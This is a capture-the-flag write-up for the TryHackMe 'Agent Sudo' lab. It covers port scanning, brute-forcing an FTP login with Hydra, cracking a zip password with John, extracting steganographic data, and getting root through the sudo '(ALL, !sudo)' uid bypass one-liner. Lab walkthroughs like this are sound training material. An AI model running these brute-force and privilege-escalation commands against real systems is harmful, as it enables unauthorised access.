## [Agent Sudo](https://tryhackme.com/room/agentsudoctf)

### Enumerate
1. How many open ports?

We start with a basic nmap scan of the machine:
```
┌──(root㉿kali)-[~]
└─# nmap -sC -sV -n $IP
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-14 08:52 UTC
Nmap scan report for 10.10.253.212
Host is up (0.036s latency).
Not shown: 997 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 ef1f5d04d47795066072ecf058f2cc07 (RSA)
|_  256 2d005cb9fda8c8d880e3924f8b4f18e2 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Annoucement
|_http-server-header: Apache/2.4.29 (Ubuntu)
MAC Address: 02:02:45:82:2C:15 (Unknown)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.13 seconds
```

This provides us with the answer to the first question: 3

2. How do you redirect yourself to a secret page?

Since the machine is running a http server it might be worth taking a look at the webpage hosted on it. We can do this by simply opening up a browser and typing in http://$IP. This brings us to a page on the website.
The answer to the question lies directly here: 'Use your own codename as user-agent to access the site.' therefore **user-agent** is the answer.

3. What is the agent name?

Now let's see what we can find...
The webpage had a greeting from 'Agent R'. 'R' is most likely the codename. It could also be an abbreviation, but let's try some single-letter codenames, starting with A. You could change the user-agent directly in the browser, however firefox seems to have some problems with it an [cURL](https://www.kali.org/tools/curl/) provides a handy option to specify a user-agent with '-A':
```
┌──(root㉿kali)-[~]
└─# curl -A "A" -L http://10.10.253.212

<!DocType html>
<html>
<head>
        <title>Annoucement</title>
</head>

<body>
<p>
        Dear agents,
        <br><br>
        Use your own <b>codename</b> as user-agent to access the site.
        <br><br>
        From,<br>
        Agent R
</p>
</body>
</html>
                                                                                         
┌──(root㉿kali)-[~]
└─# curl -A "B" -L http://10.10.253.212

...
                                                                                         
┌──(root㉿kali)-[~]
└─# curl -A "C" -L http://10.10.253.212
Attention chris, <br><br>

Do you still remember our deal? Please tell agent J about the stuff ASAP. Also, change your god damn password, is weak! <br><br>

From,<br>
Agent R
```
With 'A' and 'B' as user-agent we get the same results, however 'C' provides the answer to the question: **chris**.

### Hash cracking and brute-force
Now that we hopefully have a username, we can try to gain access.

4. FTP password

Let's go with Hydra and the good old rockyou.txt wordlist and see if we get anywhere:

```
┌──(root㉿kali)-[~]
└─# hydra -l chris -P /root/Desktop/wordlists/rockyou.txt ftp://$IP
Hydra v9.3 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-03-14 09:51:40
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ftp://10.10.253.212:21/
[21][ftp] host: 10.10.253.212   login: chris   password: crystal
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-03-14 09:52:42
```
well, well, well. Looks like we got ourselves an entry ticket to the fileserver.
With this we can now log in and download some files:
```
┌──(root㉿kali)-[~]
└─# ftp 10.10.105.30
Connected to 10.10.105.30.
220 (vsFTPd 3.0.3)
Name (10.10.105.30:root): chris
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||12517|)
150 Here comes the directory listing.
-rw-r--r--    1 0        0             217 Oct 29  2019 To_agentJ.txt
-rw-r--r--    1 0        0           33143 Oct 29  2019 cute-alien.jpg
-rw-r--r--    1 0        0           34842 Oct 29  2019 cutie.png
226 Directory send OK.
ftp> get To_agentJ.txt 
local: To_agentJ.txt remote: To_agentJ.txt
229 Entering Extended Passive Mode (|||14454|)
150 Opening BINARY mode data connection for To_agentJ.txt (217 bytes).
100% |********************************************|   217       37.38 KiB/s    00:00 ETA
226 Transfer complete.
217 bytes received in 00:00 (33.95 KiB/s)
ftp> get cute-alien.jpg 
local: cute-alien.jpg remote: cute-alien.jpg
229 Entering Extended Passive Mode (|||54946|)
150 Opening BINARY mode data connection for cute-alien.jpg (33143 bytes).
100% |********************************************| 33143       28.70 MiB/s    00:00 ETA
226 Transfer complete.
33143 bytes received in 00:00 (19.54 MiB/s)
ftp>  get cutie.png
local: cutie.png remote: cutie.png
229 Entering Extended Passive Mode (|||42093|)
150 Opening BINARY mode data connection for cutie.png (34842 bytes).
100% |********************************************| 34842       40.66 MiB/s    00:00 ETA
226 Transfer complete.
```

5. Zip file password

This question and the 'To_agentJ.txt' mention a zip file, however there is no such file present on the fileserver. The text file we aquired also states, that the alien photos are fake and contain additional information.
Let's investigate the pictures with [binwalk](https://www.kali.org/tools/binwalk/):
```
┌──(root㉿kali)-[~/Downloads]
└─# binwalk cutie.png 

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             PNG image, 528 x 528, 8-bit colormap, non-interlaced
869           0x365           Zlib compressed data, best compression
34562         0x8702          Zip archive data, encrypted compressed size: 98, uncompressed size: 86, name: To_agentR.txt
34820         0x8804          End of Zip archive, footer length: 22

                                                                                         
┌──(root㉿kali)-[~/Downloads]
└─# binwalk cute-alien.jpg 

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             JPEG image data, JFIF standard 1.01

```
cutie.png ([chookity!](https://www.imdb.com/title/tt6317068/)) file contains the mentioned zip file. We can extract it with binwalk's -e option.
As expected the zip file is password encrypted.
Using zip2john we can create a hash file, which in turn we can crack by using [john](https://www.kali.org/tools/john/#john):
```
┌──(root㉿kali)-[~/Downloads]
└─# sudo zip2john _cutie.png.extracted/8702.zip > zip.hash
                                                                                         
┌──(root㉿kali)-[~/Downloads]
└─# sudo john --wordlist=/root/Desktop/wordlists/john.lst /root/Downloads/zip.hash 
Using default input encoding: UTF-8
Loaded 1 password hash (ZIP, WinZip [PBKDF2-SHA1 256/256 AVX2 8x])
Cost 1 (HMAC size) is 78 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
alien            (8702.zip/To_agentR.txt)     
1g 0:00:00:00 DONE (2023-03-14 12:42) 8.333g/s 29550p/s 29550c/s 29550C/s 123456..sss
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```
This gives us the answer for that question.

6. steg password

In this next step, we must provide another password. 'Steg' stands for steganography and describes the practice of hiding information within another message/object/file to avoid detection. We found the zip file within the png image, the jpg image has not proven useful yet, so let's take a look at it with [Steghide](https://www.kali.org/tools/steghide/):

``` 
┌──(root㉿kali)-[~/Downloads]
└─# steghide extract -v -sf cute-alien.jpg
Enter passphrase: 
reading stego file "cute-alien.jpg"... done
extracting data... done
checking crc32 checksum... ok
writing extracted data to "message.txt"... done
```
The steg file prompted for a password. None of the passwords we discovered so far worked for this, however the text file from the previous step came in use here. The file read:
>Agent C,
>
>We need to send the picture to 'QXJlYTUx' as soon as possible!
>
>By,
>Agent R

`QXJlYTUx` certainly looks like a cryptic password, but this was also not accepted. A handy tool for lazy people (like me) to try to decode something is [CyberChef](https://gchq.github.io/CyberChef/). Just throw in the string and Cyberchef will automatically detect the encoding algorithm and decode it for you. Doing this 'QXJlYTUx' becomes 'Area51' and this gives us the password to extract the message from the jpg, which reads:
>Hi james,
>
>Glad you find this message. Your login password is hackerrules!
>
>Don't ask me why the password look cheesy, ask agent R who set this password for you.
>
>Your buddy,
>chris

This step provided us with the answers for questions 6, 7 and 8.

## capture the user flag


9. user flag
```
┌──(root㉿kali)-[~/Downloads]
└─# ssh james@10.10.105.30                
The authenticity of host '10.10.105.30 (10.10.105.30)' can't be established.
ED25519 key fingerprint is SHA256:rt6rNpPo1pGMkl4PRRE7NaQKAHV+UNkS9BfrCy8jVCA.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.105.30' (ED25519) to the list of known hosts.
james@10.10.105.30's password: 
Permission denied, please try again.
james@10.10.105.30's password: 
Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-55-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Tue Mar 14 13:07:15 UTC 2023

  System load:  0.0               Processes:           93
  Usage of /:   39.7% of 9.78GB   Users logged in:     0
  Memory usage: 15%               IP address for eth0: 10.10.105.30
  Swap usage:   0%


75 packages can be updated.
33 updates are security updates.


Last login: Tue Oct 29 14:26:27 2019
james@agent-sudo:~$ ls
Alien_autospy.jpg  user_flag.txt
james@agent-sudo:~$ cat user_flag.txt 
```
10. what is the incident of the photo called?

We can download the phtoto by executing `scp james@$IP:Alien_autospy.jpg /path/to/destination` on our machine. Now we can do a reverse google image search to find out more...

### privileg escalation

The first step in escalating priviligeses is always figuring out who you are and what privileges you have. We do this by running `sudo -l` to get an idea of where we could go. This tells us, that the user has '(ALL, !sudo)' permissions. Do a quick google search, to find the CVE to answer the first question in this section. Then we will apply the exploit we found:

```
ames@agent-sudo:~$ sudo -u \#$((0xffffffff)) /bin/bash
root@agent-sudo:~# whoami
root
root@agent-sudo:~# cat /root/root.txt
To Mr.hacker,

Congratulation on rooting this box. This box was designed for TryHackMe. Tips, always update your machine. 

Your flag is 
b53#################0c062

By,
DesKel a.k.a Agent R

```


